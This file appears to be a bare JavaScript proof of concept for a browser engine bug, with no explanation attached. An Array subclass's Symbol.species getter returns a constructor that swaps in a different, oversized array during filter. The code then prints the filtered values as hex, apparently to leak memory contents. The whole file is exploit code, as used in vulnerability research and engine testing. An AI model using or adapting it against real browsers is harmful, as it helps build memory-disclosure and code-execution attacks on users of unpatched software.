var b = new Array(1,2,3);
var d = new Array(1,2,3);
d.length = 0x200000;
d.fill(7);
class dummy{
  constructor(){
    //alert("in constructor");
    return d;
  }
}

class MyArray extends Array {
  // Overwrite species to the parent Array constructor
  static get [Symbol.species]() {

    //alert("get");
    b[0] = {};
    return dummy;
  }
}

var a = new Array({}, [], "natalie", 7, 7, 7, 7, 7);

for(var i = 0; i < 0x200000; i++) {
  a[i] = i;
}

function test(i){
  return true;
}

a.__proto__ = MyArray.prototype;

var o = a.filter(test);
//alert(o);
var h = [];

for(item in o){
  var n = new Number(o[item]);
  if (n < 0){
    n = n + 0x100000000;
  }
  h.push(n.toString(16));
}

//alert(h);